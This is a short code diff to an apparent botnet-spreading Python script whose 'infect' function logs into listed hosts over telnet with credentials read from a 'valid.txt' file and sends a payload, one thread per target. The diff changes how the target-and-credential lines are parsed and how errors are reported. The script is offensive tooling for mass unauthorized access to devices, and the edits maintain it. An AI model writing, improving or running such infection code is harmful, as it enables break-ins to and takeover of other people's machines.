@@ -12,7 +12,6 @@ def infect(ip, port, user, passwd):
         tn.read_until(b"Password: ")
         tn.write(passwd.encode('ascii') + b"\n")
         
-        # Wait for shell prompt
         index, _, _ = tn.expect([b"#", b">", b"$"], timeout=5)
         if index >= 0:
             print(f"[+] Logged in to {ip}, sending payload...")
@@ -27,10 +26,12 @@ def load_targets(file):
         lines = f.read().splitlines()
         for line in lines:
             try:
-                ip, port, user, passwd = line.strip().split(":")
+                hostpart, credpart = line.strip().split()
+                ip, port = hostpart.split(":")
+                user, passwd = credpart.split(":")
                 threading.Thread(target=infect, args=(ip, int(port), user, passwd)).start()
-            except:
-                continue
+            except Exception as e:
+                print(f"[-] Skipping line due to error: {e}")
 
 if __name__ == "__main__":
     load_targets("valid.txt")
